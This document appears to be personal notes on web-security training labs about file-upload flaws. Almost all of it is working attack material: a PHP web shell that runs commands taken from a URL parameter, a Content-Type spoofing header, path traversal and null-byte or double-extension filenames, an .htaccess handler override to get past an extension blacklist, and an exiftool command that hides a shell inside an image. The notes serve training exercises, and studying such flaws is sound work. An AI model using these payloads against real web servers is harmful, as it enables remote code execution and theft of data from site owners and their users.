`<?php echo system($_GET['command']); ?>`
#### Web shell upload via Content-Type restriction bypass
1. Content-Disposition: form-data; name="avatar"; filename="img4.php"
        Content-Type: image/png
        **Sometimes Works**
#### Web shell upload via path traversal

`<?php echo file_get_contents('/home/carlos/secret'); ?>`
`%2e%2e%2fshell.php`
#### Web shell upload via extension blacklist bypass
1. .htaccess:
```php
   AddHandler application/x-httpd-php .html .php
```
2. upload shell.html after uploading .htaccess
#### Web shell upload via obfuscated file extension
works
```php
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
Content-Type: application/x-php
=================================================================================
Content-Disposition: form-data; name="avatar"; filename="shell.php.jpg"
Content-Type: application/x-php
=================================================================================
```

#### Remote code execution via polyglot web shell upload
```bash
exiftool -Comment='<?php echo system($_GET['command']); ?>' ~/Downloads/876t.jpg -o portswigger.php
```
